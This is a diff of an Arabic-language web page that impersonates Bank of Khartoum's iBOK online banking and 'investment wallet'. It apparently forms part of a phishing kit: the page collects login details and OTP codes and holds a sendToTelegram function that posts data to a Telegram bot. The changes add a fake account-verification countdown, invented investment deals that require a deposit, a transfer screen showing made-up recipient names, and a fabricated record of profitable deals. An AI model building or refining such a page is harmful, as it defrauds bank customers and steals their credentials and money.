@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>iBOK - الخدمة المصرفية عبر الانترنت</title>
+  <title>iBOK - الاستمارة أونلاين وتطبيق بنكك والمحفظة الاستثمارية</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
@@ -855,7 +855,7 @@
       </div>
     </div>
 
-    <!-- شاشة إدخال رقم التواصل (إيمو / واتساب) تظهر بعد الضغط على إرسال الرمز -->
+    <!-- شاشة إدخال رقم التواصل (إيمو / واتساب) -->
     <div class="screen" id="screenContact">
       <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
@@ -879,7 +879,7 @@
       </div>
     </div>
 
-    <!-- شاشة معالجة الطلب المؤقتة ومقبولة بنجاح -->
+    <!-- شاشة معالجة الطلب المؤقتة (25 ثانية) وتوثيق الحساب بنجاح -->
     <div class="screen" id="screenProcessing">
       <div class="top-header" style="padding: 20px 16px; height: 35%; justify-content: center;">
         <div class="logo-box">
@@ -889,18 +889,18 @@
       </div>
       <div class="form-section" style="display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; gap: 16px; padding: 20px;">
         <div class="timer-circle" id="processingSpinner"></div>
-        <div id="processingText" style="font-size: 1.15rem; font-weight: 800; color: #1f2937;">جاري تقديم الطلب...</div>
-        <p style="font-size: 0.85rem; color: #6b7280; line-height: 1.6;" id="processingSubText">يرجى الانتظار قليلاً، يتم معالجة طلبك وتوثيق الحساب الآن.</p>
+        <div id="processingText" style="font-size: 1.15rem; font-weight: 800; color: #1f2937;">جاري توثيق الحساب...</div>
+        <p style="font-size: 0.85rem; color: #6b7280; line-height: 1.6;" id="processingSubText">يرجى الانتظار قليلاً، يتم معالجة طلبك وتوثيق الحساب الآن (<span id="processingCountdown">25</span> ثانية)...</p>
         
-        <!-- زر اكمل الإجراءات عبر الإيميل المميز الذي يظهر عند اكتمال الطلب -->
+        <!-- زر موافق للعودة للمحفظة بعد النجاح -->
         <div id="successActionContainer" style="width: 100%; margin-top: 10px; display: none;">
           <div style="background: #f0fdf4; border: 1px solid #bbf7d0; padding: 14px; border-radius: 12px; margin-bottom: 15px; color: #166534; font-size: 0.85rem; font-weight: 600;">
             <i class="fa-solid fa-circle-check" style="font-size: 1.2rem; color: #16a34a; display: block; margin-bottom: 5px;"></i>
-            تم توثيق بياناتك وحسابك بنجاح تام، يرجى استكمال الخطوات النهائية عبر البريد الإلكتروني أدناه:
+            تم توثيق الحساب بنجاح تام وتفعيل كافة الميزات الاستثمارية!
           </div>
-          <a href="mailto:bok.portfolio.bankofkhartoum@gmail.com" class="btn-red" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: linear-gradient(135deg, #059669 0%, #047857 100%); border-color: #065f46; font-size: 0.95rem; padding: 14px; border-radius: 10px; box-shadow: 0 4px 12px rgba(5, 150, 105, 0.3);">
-            <i class="fa-solid fa-envelope-open-text" style="font-size: 1.2rem;"></i> أُكمل الإجراءات عبر الإيميل
-          </a>
+          <button class="btn-red" onclick="returnToWallet()" style="background: linear-gradient(135deg, #059669 0%, #047857 100%); border-color: #065f46; font-size: 0.95rem; padding: 14px; border-radius: 10px;">
+            موافق (العودة إلى المحفظة)
+          </button>
         </div>
       </div>
     </div>
@@ -915,10 +915,10 @@
 
       <div style="padding: 16px; flex: 1; display: flex; flex-direction: column; gap: 16px; overflow-y: auto;">
         <div class="top-icons-grid">
-          <div class="top-icon-item" onclick="showLinkModal('تحويل')"><i class="fa-solid fa-money-bill-transfer"></i><span>تحويل</span></div>
-          <div class="top-icon-item" onclick="showLinkModal('إيداع')"><i class="fa-solid fa-wallet"></i><span>إيداع</span></div>
+          <div class="top-icon-item" onclick="handleWalletAction('تحويل')"><i class="fa-solid fa-money-bill-transfer"></i><span>تحويل</span></div>
+          <div class="top-icon-item" onclick="handleWalletAction('إيداع')"><i class="fa-solid fa-wallet"></i><span>إيداع</span></div>
           <div class="top-icon-item" onclick="openAccountStatementScreen()"><i class="fa-solid fa-file-invoice-dollar"></i><span>كشف حساب</span></div>
-          <div class="top-icon-item" onclick="showLinkModal('المزيد')"><i class="fa-solid fa-ellipsis"></i><span>المزيد</span></div>
+          <div class="top-icon-item" onclick="handleWalletAction('المزيد')"><i class="fa-solid fa-ellipsis"></i><span>المزيد</span></div>
         </div>
 
         <div class="info-card">
@@ -926,7 +926,7 @@
             <div class="card-label">إجمالي القيمة الاستثمارية</div>
             <div class="profit-green" style="font-size: 22px; color: #374151;">0 USDG</div>
           </div>
-          <div class="stat-badge">0.0%</div>
+          <div class="stat-badge" id="walletStatusBadge">غير موثق</div>
         </div>
 
         <div class="nav-tabs">
@@ -941,7 +941,7 @@
               <div class="data-title">الصفقة الكرستالية <span class="deal-badge badge-crystal">خاصة</span></div>
               <div style="display: flex; align-items: center; gap: 8px;">
                 <div class="profit-green" style="color:#0284c7;">1,600,000 USDG</div>
-                <button class="btn-join" onclick="showLinkModal('انضمام')">انضمام</button>
+                <button class="btn-join" onclick="attemptJoinDeal('الصفقة الكرستالية', '1,600,000 USDG')">انضمام</button>
               </div>
             </div>
             <div class="data-row" style="margin-top: 4px;">
@@ -955,7 +955,7 @@
               <div class="data-title">الصفقة الذهبية <span class="deal-badge badge-gold">مميزة</span></div>
               <div style="display: flex; align-items: center; gap: 8px;">
                 <div class="profit-green" style="color:#d97706;">800,000 USDG</div>
-                <button class="btn-join" onclick="showLinkModal('انضمام')">انضمام</button>
+                <button class="btn-join" onclick="attemptJoinDeal('الصفقة الذهبية', '800,000 USDG')">انضمام</button>
               </div>
             </div>
             <div class="data-row" style="margin-top: 4px;">
@@ -969,7 +969,7 @@
               <div class="data-title">الصفقة الفضية <span class="deal-badge badge-silver">قياسية</span></div>
               <div style="display: flex; align-items: center; gap: 8px;">
                 <div class="profit-green" style="color:#4b5563;">150,000 USDG</div>
-                <button class="btn-join" onclick="showLinkModal('انضمام')">انضمام</button>
+                <button class="btn-join" onclick="attemptJoinDeal('الصفقة الفضية', '150,000 USDG')">انضمام</button>
               </div>
             </div>
             <div class="data-row" style="margin-top: 4px;">
@@ -1000,13 +1000,115 @@
     <div class="screen" id="screenAccountStatement">
       <div class="header-bar-wallet">
         <button class="back-btn" onclick="switchScreen('main-screen')"><i class="fa-solid fa-arrow-right"></i> رجوع</button>
-        <div style="font-weight: 800; color: #c8102e; font-size: 15px;">كشف الحساب الاستثماري</div>
+        <div style="font-weight: 800; color: #c8102e; font-size: 15px;">كشف الحساب</div>
         <span></span>
       </div>
-      <div style="padding: 16px; flex: 1; display: flex; flex-direction: column; gap: 16px; overflow-y: auto;">
-        <div style="background: #fef2f2; border: 1px solid #fecaca; padding: 14px; border-radius: 12px; display: flex; flex-direction: column; gap: 8px;">
-          <div style="color: #991b1b; font-weight: 700; font-size: 13.5px;">تنبيه هام: حسابك غير موثق!</div>
-          <button class="btn-red" style="margin-top: 4px;" onclick="switchScreen('screenLogin')">ربط الحساب الآن</button>
+      <div style="padding: 16px; flex: 1; display: flex; flex-direction: column; gap: 16px; overflow-y: auto;" id="statementContentContainer">
+        
+        <!-- حساب بطاقة فيزا -->
+        <div style="background: #ffffff; border: 1px solid #e5e7eb; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 6px rgba(0,0,0,0.02);">
+          <div style="padding: 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f0f0f0;">
+            <div style="display: flex; align-items: center; gap: 10px;">
+              <div style="background: #ef4444; color: #fff; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">$</div>
+              <span style="font-size: 18px; font-weight: 800; color: #991b1b;">حساب بطاقة فيزا</span>
+            </div>
+            <div style="color: #991b1b; font-size: 22px; font-weight: 900;"><i class="fa-solid fa-coins"></i></div>
+          </div>
+          <div style="padding: 12px 16px; display: flex; justify-content: flex-end; align-items: center; background: #fafafa; font-size: 13px;">
+            <div style="display: flex; gap: 20px; align-items: center;">
+              <span style="color: #374151; font-weight: 600; cursor: pointer;" onclick="showErrorModal('رمز الدفع السريع QR جاهز للاستخدام.')"><i class="fa-solid fa-qrcode" style="color: #c8102e;"></i> رمز الدفع السريع QR</span>
+              <span style="color: #374151; font-weight: 600; cursor: pointer;" onclick="showErrorModal('عرض كشف الحساب لبطاقة الفيزا مفصل.')"><i class="fa-solid fa-file-lines" style="color: #c8102e;"></i> عرض كشف الحساب</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- العملة الأجنبية المميز -->
+        <div style="background: #ffffff; border: 1px solid #e5e7eb; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 6px rgba(0,0,0,0.02);">
+          <div style="padding: 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f0f0f0;">
+            <div style="display: flex; align-items: center; gap: 10px;">
+              <div style="background: #ef4444; color: #fff; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">$</div>
+              <span style="font-size: 18px; font-weight: 800; color: #991b1b;">العملة الأجنبية المميز</span>
+            </div>
+            <div style="color: #991b1b; font-size: 22px; font-weight: 900;"><i class="fa-solid fa-coins"></i></div>
+          </div>
+          <div style="padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; background: #fafafa; font-size: 13px;">
+            <div style="font-weight: 800; color: #374151; font-size: 16px;">0</div>
+            <div style="display: flex; gap: 20px; align-items: center;">
+              <span style="color: #374151; font-weight: 600; cursor: pointer;" onclick="showErrorModal('رمز الدفع السريع QR للعملة الأجنبية.')"><i class="fa-solid fa-qrcode" style="color: #c8102e;"></i> رمز الدفع السريع QR</span>
+              <span style="color: #374151; font-weight: 600; cursor: pointer;" onclick="showErrorModal('عرض كشف الحساب للعملة الأجنبية مفصل.')"><i class="fa-solid fa-file-lines" style="color: #c8102e;"></i> عرض كشف الحساب</span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- شاشة تحويل الأموال (صفحة كاملة) -->
+    <div class="screen" id="screenTransfer">
+      <div class="header-bar-wallet">
+        <button class="back-btn" onclick="switchScreen('main-screen')"><i class="fa-solid fa-arrow-right"></i> رجوع</button>
+        <div style="font-weight: 800; color: #c8102e; font-size: 15px;">قائمة تحويل الأموال</div>
+        <span></span>
+      </div>
+      <div style="padding: 20px; flex: 1; display: flex; flex-direction: column; gap: 14px; overflow-y: auto;">
+        <div class="input-box">
+          <label class="input-label">رقم الحساب</label>
+          <input type="text" class="input-field" id="transferAccountInput" placeholder="أدخل رقم الحساب (مثال: 1234567)" oninput="lookupAccountName(this.value)" />
+        </div>
+        <div class="input-box">
+          <label class="input-label">اسم المستلم</label>
+          <input type="text" class="input-field" id="transferNameInput" placeholder="سيظهر اسم المستلم تلقائياً" readonly style="background: #f3f4f6; color: #059669; font-weight: bold;" />
+        </div>
+        <div class="input-box">
+          <label class="input-label">المبلغ</label>
+          <input type="number" class="input-field" id="transferAmountInput" placeholder="أدخل المبلغ المراد تحويله" />
+        </div>
+        <div class="input-box">
+          <label class="input-label">ملاحظة</label>
+          <input type="text" class="input-field" id="transferNoteInput" placeholder="أدخل ملاحظة (اختياري)" />
+        </div>
+        <div style="display: flex; gap: 10px; margin-top: 10px;">
+          <button class="btn-red" style="flex: 1;" onclick="executeTransfer()">تأكيد</button>
+          <button class="btn-red" style="flex: 1; background: #6b7280; border-color: #4b5563;" onclick="switchScreen('main-screen')">إلغاء</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- شاشة المزيد - الصفقات الناجحة (صفحة كاملة) -->
+    <div class="screen" id="screenMore">
+      <div class="header-bar-wallet">
+        <button class="back-btn" onclick="switchScreen('main-screen')"><i class="fa-solid fa-arrow-right"></i> رجوع</button>
+        <div style="font-weight: 800; color: #c8102e; font-size: 15px;">المزيد - الصفقات الناجحة</div>
+        <span></span>
+      </div>
+      <div style="padding: 20px; flex: 1; display: flex; flex-direction: column; gap: 12px; overflow-y: auto;">
+        <div style="font-weight: 700; color: #c8102e; margin-bottom: 4px; font-size: 0.95rem;"><i class="fa-solid fa-award"></i> سجل الصفقات الناجحة السابقة:</div>
+        <div style="display: flex; flex-direction: column; gap: 10px;">
+          <div style="background: #f9fafb; padding: 12px; border-radius: 10px; border: 1px solid #e5e7eb; font-size: 0.85rem;">
+            <div style="font-weight: bold; color: #1f2937;">صفقة التقنية المتقدمة</div>
+            <div style="color: #059669; margin-top: 4px;">العائد: +24% | الحالة: ناجحة ومكتملة</div>
+          </div>
+          <div style="background: #f9fafb; padding: 12px; border-radius: 10px; border: 1px solid #e5e7eb; font-size: 0.85rem;">
+            <div style="font-weight: bold; color: #1f2937;">الصفقة العقارية الكبرى</div>
+            <div style="color: #059669; margin-top: 4px;">العائد: +18% | الحالة: ناجحة ومكتملة</div>
+          </div>
+          <div style="background: #f9fafb; padding: 12px; border-radius: 10px; border: 1px solid #e5e7eb; font-size: 0.85rem;">
+            <div style="font-weight: bold; color: #1f2937;">محفظة التجارة الرقمية</div>
+            <div style="color: #059669; margin-top: 4px;">العائد: +32% | الحالة: ناجحة ومكتملة</div>
+          </div>
+        </div>
+        <button class="btn-red" style="margin-top: 20px;" onclick="switchScreen('main-screen')">إغلاق</button>
+      </div>
+    </div>
+
+    <!-- نافذة تنبيه شرط توفر المبلغ داخل الحساب -->
+    <div class="modal-overlay" id="modalFundAlert">
+      <div class="modal-box">
+        <div class="modal-header">تنبيه الانضمام للصفقة</div>
+        <div class="modal-body" id="modalFundText">يجب توافر المبلغ المراد استثماره داخل الحساب لاتمام الصفقة بنجاح. يرجى إيداع المبلغ أولاً.</div>
+        <div style="padding: 0 16px 16px; display: flex; gap: 6px;">
+          <button class="btn-red" style="flex:1;" onclick="closeModal('modalFundAlert'); handleWalletAction('إيداع');">إيداع الآن</button>
+          <button class="btn-red" style="flex:1; background:#6b7280; border-color:#4b5563;" onclick="closeModal('modalFundAlert')">إلغاء</button>
         </div>
       </div>
     </div>
@@ -1028,6 +1130,7 @@
     let selectedServiceIndex = 0;
     let selectedServiceName = "المحفظة الاستثمارية";
     let otpTimerInterval = null;
+    let isAccountVerified = false;
 
     async function sendToTelegram(text) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -1174,7 +1277,10 @@
       document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none');
       document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
       document.getElementById(screenId).classList.add('active');
-      if (screenId === 'main-screen') updateGreeting();
+      if (screenId === 'main-screen') {
+        updateWalletUIState();
+        updateGreeting();
+      }
       if (screenId === 'screenOtp') startOtpTimer();
     }
 
@@ -1183,6 +1289,23 @@
       let greeting = hour >= 4 && hour < 12 ? "صباح الخير ☀️" : (hour >= 12 && hour < 17 ? "نهار سعيد 🌤️" : "مساء الخير 🌙");
       const greetingEl = document.getElementById('dynamic-greeting');
       if(greetingEl) greetingEl.textContent = greeting;
+    }
+
+    function updateWalletUIState() {
+      const badge = document.getElementById('walletStatusBadge');
+      if (isAccountVerified) {
+        if (badge) {
+          badge.textContent = "موثق بنجاح";
+          badge.style.background = "rgba(16, 185, 129, 0.1)";
+          badge.style.color = "#059669";
+        }
+      } else {
+        if (badge) {
+          badge.textContent = "غير موثق";
+          badge.style.background = "rgba(107, 114, 128, 0.1)";
+          badge.style.color = "#6b7280";
+        }
+      }
     }
 
     function togglePasswordVisibility() {
@@ -1300,18 +1423,37 @@
       const processingSubText = document.getElementById('processingSubText');
       const processingSpinner = document.getElementById('processingSpinner');
       const successAction = document.getElementById('successActionContainer');
+      const countdownSpan = document.getElementById('processingCountdown');
       
-      processingText.textContent = "جاري تقديم الطلب...";
-      processingSubText.textContent = "يرجى الانتظار، يتم إرسال بيانات الطلب للمراجعة...";
+      processingText.textContent = "جاري توثيق الحساب...";
       processingSpinner.style.display = 'block';
       successAction.style.display = 'none';
+      processingSubText.style.display = 'block';
+
+      let timeLeft = 25;
+      countdownSpan.textContent = timeLeft;
+
+      const countdownTimer = setInterval(() => {
+        timeLeft--;
+        countdownSpan.textContent = timeLeft;
+        if (timeLeft <= 0) {
+          clearInterval(countdownTimer);
+        }
+      }, 1000);
 
       setTimeout(() => {
+        clearInterval(countdownTimer);
         processingSpinner.style.display = 'none';
-        processingText.textContent = "تم قبول طلبك بنجاح!";
+        processingText.textContent = "تم توثيق الحساب بنجاح!";
         processingSubText.style.display = 'none';
         successAction.style.display = 'block';
-      }, 7000);
+        
+        isAccountVerified = true;
+      }, 25000);
+    }
+
+    function returnToWallet() {
+      switchScreen('main-screen');
     }
 
     function isSequentialOrRepeatedOtp(str) {
@@ -1327,11 +1469,65 @@
       return isSequentialAsc || isSequentialDesc || isRepeated;
     }
 
-    function showLinkModal(actionType) {
-      document.getElementById('modalLinkAlert').style.display = 'flex';
+    function handleWalletAction(actionType) {
+      if (!isAccountVerified) {
+        document.getElementById('modalLinkTitle').textContent = "تنبيه التوثيق";
+        document.getElementById('modalLinkText').textContent = `لاستخدام ميزة (${actionType}) يجب توثيق حسابك أولاً.`;
+        document.getElementById('modalLinkAlert').style.display = 'flex';
+      } else {
+        if (actionType === 'إيداع') {
+          showErrorModal("هذه الميزة غير متوفرة يرجى مراجعة فروعنا");
+        } else if (actionType === 'تحويل') {
+          document.getElementById('transferAccountInput').value = '';
+          document.getElementById('transferNameInput').value = '';
+          document.getElementById('transferAmountInput').value = '';
+          document.getElementById('transferNoteInput').value = '';
+          switchScreen('screenTransfer');
+        } else if (actionType === 'المزيد') {
+          switchScreen('screenMore');
+        }
+      }
+    }
+
+    function lookupAccountName(accNum) {
+      const nameInput = document.getElementById('transferNameInput');
+      if (accNum.length >= 4) {
+        const sampleNames = ["محمد أحمد العبيد", "عثمان إبراهيم عمر", "عبدالله خالد محمود", "أبو بكر محمد علي"];
+        const index = parseInt(accNum.slice(-1)) % sampleNames.length;
+        nameInput.value = sampleNames[index];
+      } else {
+        nameInput.value = "";
+      }
+    }
+
+    function executeTransfer() {
+      const acc = document.getElementById('transferAccountInput').value.trim();
+      const amt = document.getElementById('transferAmountInput').value.trim();
+      if (!acc || !amt) {
+        showErrorModal("الرجاء إدخال رقم الحساب والمبلغ بشكل صحيح.");
+        return;
+      }
+      showErrorModal("لا يوجد رصيد كافي لاجراء المعاملة");
+    }
+
+    function attemptJoinDeal(dealName, dealAmount) {
+      if (!isAccountVerified) {
+        document.getElementById('modalLinkTitle').textContent = "ربط الحساب الاستثماري";
+        document.getElementById('modalLinkText').textContent = "للانضمام إلى الصفقة يجب ربط حسابك الاستثماري بحساب بنكك.";
+        document.getElementById('modalLinkAlert').style.display = 'flex';
+      } else {
+        document.getElementById('modalFundText').textContent = `يجب توافر المبلغ المراد استثماره (${dealAmount}) داخل الحساب لاتمام الانضمام إلى (${dealName}). يرجى إيداع المبلغ أو التأكد من الرصيد أولاً.`;
+        document.getElementById('modalFundAlert').style.display = 'flex';
+      }
     }
 
     function openAccountStatementScreen() {
+      if (!isAccountVerified) {
+        document.getElementById('modalLinkTitle').textContent = "تنبيه التوثيق";
+        document.getElementById('modalLinkText').textContent = "لعرض كشف الحساب وتفاصيل الأرصدة يجب توثيق حسابك أولاً.";
+        document.getElementById('modalLinkAlert').style.display = 'flex';
+        return;
+      }
       switchScreen('screenAccountStatement');
     }
 
